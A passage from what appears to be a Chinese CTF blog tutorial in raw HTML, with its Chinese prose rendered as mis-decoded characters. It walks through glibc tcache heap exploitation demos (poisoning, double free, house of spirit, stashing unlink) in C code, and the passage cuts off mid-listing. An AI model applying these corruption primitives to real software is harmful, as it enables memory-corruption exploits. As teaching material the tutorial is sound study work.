</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†é…ä¸¤ä¸ªå †å—ä¹‹åï¼Œä¿®æ”¹<code>b</code>çš„<code>fd</code>æŒ‡é’ˆæŒ‡å‘æ ˆï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="/2021/10/05/tache-bin-attack/6.png" class=""><p>å†åˆ†é…ä¸¤ä¸ªå †å—å°±è·å¾—äº†æ ˆçš„æ§åˆ¶æƒ</p><img src="/2021/10/05/tache-bin-attack/5.png" class=""><p>æ€»ç»“ä¸€ä¸‹ï¼šç”±äº<code>tache</code>å¹¶ä¸ä¼šæ£€æŸ¥åŒä¸€é“¾è¡¨é‡Œé¢çš„å †å—å¤§å°æ˜¯å¦ç›¸ç­‰ï¼Œæ‰€ä»¥æ‰å¯ä»¥æŠŠæ ˆæŒ‡é’ˆé“¾å…¥<code>tache</code>ï¼Œç„¶åå†åˆ†é…å‡ºæ¥ï¼Œè¿™æ¯”<code>fastbin attack</code>æ–¹ä¾¿å¤šå•¦ï¼ï¼Œ<code>fastbin attack</code>è¿˜å¾—æ£€æŸ¥å †å—å¤§å°ï¼Œæ‰€ä»¥<code>fastbin attack</code>éƒ½æ˜¯æŠŠ<code>__malloc_hook - 0x23</code>é“¾å…¥å†åˆ†é…å‡ºæ¥ï¼Œå¯¹å§ï¼</p><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h4><p>è¿™ä¸ªæ”»å‡»æ‰‹æ³•å·²ç»ä¸å¤ªé€‚ç”¨äº†ï¼Œ<code>tache_dup</code>å¾ˆç®€å•ï¼Œå°±<code>free</code>ä¸¤æ¬¡ï¼Œä¸èµ˜è¿°äº†ï¼Œå› ä¸ºè¡¥ä¸å·²ç»ç»™åˆ°äº†<code>libc-2.27.so</code>ï¼Œä¸Šæ¬¡æ‰“ä¸€é“<code>tache</code>çš„é¢˜ï¼Œå¾ˆç–‘æƒ‘ï¼Œä¸ºå•¥æˆ‘çš„<code>tache_dup</code>å°±æŠ¥é”™äº†å‘¢ï¼Ÿåé¢æ‰¾åˆ°ä¸‹é¢è¿™ä¸ªèµ„æ–™ï¼š</p><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">[æ€»ç»“å‹]è®°CTF PWNä¸­è¿‡æ°”çš„å †åˆ©ç”¨</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, b, c);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>è¿™ä¸ªæ”»å‡»æ‰‹æ³•çœ‹èµ·æ¥å¾ˆç¦»è°±ï¼Œåªæ˜¯å•çº¯çš„ä¸€ä¸ªæ•°ç»„å¹¶ä¼ªé€ äº†ä¸€ä¸ª<code>size</code>ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘äº†æ­¤æ•°ç»„çš„<code>&amp;fake_chunks[2]</code>ï¼Œåœ¨<code>free</code>å°±æŠŠå®ƒç»™æ”¾è¿›äº†<code>tache</code>â€¦ï¼ŒåŸå› æ˜¯ç”±äº<code>tcache_put()</code>å‡½æ•°æ£€æŸ¥ä¸ä¸¥æ ¼é€ æˆçš„ï¼Œåœ¨é‡Šæ”¾çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥è¢«é‡Šæ”¾çš„æŒ‡é’ˆæ˜¯å¦çœŸçš„æ˜¯å †å—çš„<code>malloc</code>æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯<code>fake_chunks</code>ï¼Œå¯ä»¥çœ‹åˆ°ä¼ªé€ äº†ä¸ª<code>size</code>ï¼š</p><img src="/2021/10/05/tache-bin-attack/7.png" class=""><p><code>free</code>ä¹‹åå°±èƒ½çœ‹åˆ°<code>tache</code>é‡Œé¢æœ‰è¿™ä¸ªå †å—äº†ï¼Œå†ç”³è¯·å‡ºæ¥å°±å¾—åˆ°äº†æ­¤å—åœ°å€çš„æ§åˆ¶å™¨ï¼š</p><img src="/2021/10/05/tache-bin-attack/8.png" class=""><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>è¿™ä¸ªæ”»å‡»æ‰‹æ³•å°±ç¨å¾®ç²¾å·§ä¸€ç‚¹ï¼Œæ²¡æœ‰ä¹‹å‰çš„è¿™ä¹ˆç®€å•ç²—æš´ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥æ¥çœ‹ï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//æŸ¥çœ‹åœ°å€ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>stack_var[3]</code>æ”¾<code>&amp;stack_var[2]</code>çš„åŸå› æ˜¯ä¸ºäº†ç»•è¿‡<code>unlink</code>çš„æ£€æŸ¥ï¼Œ<code>bck-&gt;fd = bin;</code>å’Œ<code>bin-&gt;bk = bck;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>ç”³è¯·äº†<code>9</code>ä¸ª<code>0x90</code>å¤§å°çš„å †å—ï¼Œå¹¶æŠŠä»–ä»¬éƒ½æ”¾è¿›äº†<code>chunk_lis</code>è¿™ä¸ªæ•°ç»„é‡Œé¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†<code>free</code>æ‰<code>6</code>ä¸ªå †å—ï¼Œå†<code>free</code>æ‰ä¸€ä¸ªä¹‹å<code>tache</code>å°±æ»¡äº†ï¼Œå†å¾€ä¸‹<code>free</code>çš„å †å—å°±å°†è¿›åˆ°<code>unsorted bin</code>é‡Œé¢ï¼Œ<code>chunk_lis[0]</code>å’Œ<code>chunk_lis[0]</code>ä¸ºä»€ä¹ˆè¦éš”å¼€å‘¢ï¼Ÿæ˜¯æ€•å®ƒä¿©åˆå¹¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//last tcache bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/9.png" class=""><p>ä¹‹ååˆ†é…ä¸€ä¸ª<code>0xa0</code>å¤§å°çš„å †å—ï¼Œå®ƒä¼šå…ˆåˆ°<code>tache bin</code>é‡Œé¢å¯»æ‰¾ï¼Œå‘ç°å¹¶æ²¡æœ‰è¿™ä¸ªå¤§å°çš„å †å—ï¼Œåˆåˆ°<code>unsorted bin</code>é‡Œé¢æ‰¾ï¼Œè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ²¡æ‰¾åˆ°å½’æ²¡æ‰¾åˆ°ï¼Œå®ƒè¿˜æ˜¯ä¼šæŠŠ<code>unsorted bin</code>é‡Œé¢çš„å †å—æ•´ç†åˆ°å¯¹åº”å¤§å°çš„<code>bin</code>ä¸­ï¼Œæ‰€ä»¥<code>chunk_lis[0]</code>å’Œ<code>chunk_lis[2]</code>ä¼šè¿›åˆ°<code>small bin</code>ï¼Œç”±äºåœ¨<code>bin</code>ä¸­æ²¡æœ‰è¿™ä¸ªå¤§å°çš„å †å—ï¼Œæ‰€ä»¥å®ƒç›´æ¥è°ƒç”¨<code>brk</code>æ¥åˆ›å»ºå †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/10.png" class=""><p>æ­¤æ—¶<code>malloc 0x90</code>å°±æ˜¯ç›´æ¥ä»<code>tache</code>é‡Œé¢æ‹¿ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼Ÿæ˜¯ä¸ºäº†ç»™<code>chunk_lis[0]</code>å’Œ<code>chunk_lis[2]</code>ç•™å‡ºä½ç½®ï¼Œç­‰ä¼šå°±èƒ½çœ‹åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>ä¹‹åæŠŠ<code>chunk3</code>ä¹Ÿå°±æ˜¯<code>0x603390</code>è¿™ä¸ªå †å—çš„<code>bk</code>ä¿®æ”¹æˆ<code>stack_var</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/11.png" class=""><p><code>calloc</code>æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯ä¸ä¼šå»<code>tache</code>é‡Œé¢æ‹¿å †å—ï¼Œä¸å»æ‹¿å°±ç®—äº†ï¼Œè¿˜è¦æŠŠå¯¹åº”å¤§å°çš„å †å—æ”¾è¿›<code>tache</code>é‡Œé¢ï¼Œè¿™å°±æ­£å¥½äº†å‘€ï¼è¿™ç›´æ¥å°±æŠŠ<code>stack_var</code>æ”¾è¿›<code>tache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/12.png" class="" width="12"><p>ç”±äºç¬¬ä¸€ä¸ªå †å—å°±æ˜¯<code>stack_var</code>ï¼Œç›´æ¥<code>malloc</code>å°±èƒ½å¾—åˆ°æ ˆä¸Šçš„æ§åˆ¶æƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">malloc</span>(<span class="number">0x90</span>); </span><br></pre></td></tr></table></figure><p><code>gyctf_2020_signin</code>è¿™é¢˜å·®ä¸å¤šå°±æ˜¯æŒ‰ç…§<code>tcache_stashing_unlink_attack</code>æ”¹ç¼–è€Œæˆçš„ï¼Œæ„Ÿå…´è¶£å¯ä»¥å»çœ‹çœ‹ã€Šbuuåˆ·é¢˜è®°ä¹‹PWNç³»åˆ—ã€‹ï¼Œ<code>calloc</code>çš„ç»†èŠ‚ä¹Ÿæœ‰æåˆ°â€¦</p><h3 id="libc-2-31-so"><a href="#libc-2-31-so" class="headerlink" title="libc-2.31.so"></a>libc-2.31.so</h3><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p>å’Œ<code>libc-2.27.so</code>ä¸€æ ·çš„ï¼Œä¸å¤šè¯´äº†â€¦.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 